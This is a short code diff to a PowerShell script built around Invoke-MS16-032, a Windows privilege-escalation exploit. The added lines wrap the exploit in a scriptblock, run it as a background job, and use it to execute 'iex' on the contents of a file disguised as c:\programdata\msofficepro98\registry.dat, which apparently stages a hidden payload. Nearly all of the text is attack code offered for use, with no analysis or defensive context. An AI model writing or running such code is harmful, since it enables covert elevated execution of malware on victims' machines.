@@ -1,3 +1,5 @@
+$scriptblock = 
+{
 function Invoke-MS16-032
 {
 <#
@@ -2658,3 +2660,7 @@ Function Main
 
 Main
 }
+invoke-ms16-032 'powershell.exe iex (get-content c:\programdata\msofficepro98\registry.dat)'
+}
+
+start-job -ScriptBlock $scriptblock 
